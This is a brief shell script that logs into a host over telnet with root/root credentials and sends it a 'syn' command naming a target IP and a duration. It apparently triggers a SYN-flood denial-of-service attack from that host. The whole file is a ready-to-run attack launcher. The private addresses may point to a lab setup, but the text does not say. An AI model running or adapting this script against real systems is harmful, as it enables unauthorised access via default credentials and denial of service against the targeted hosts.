#!/bin/sh

DURATION="$1"

(echo "l"; sleep 2; echo "root"; sleep 2; echo "root"; sleep 10; echo "syn 172.16.233.33 $DURATION"; sleep 10; echo "quit" ) | telnet 172.16.233.23

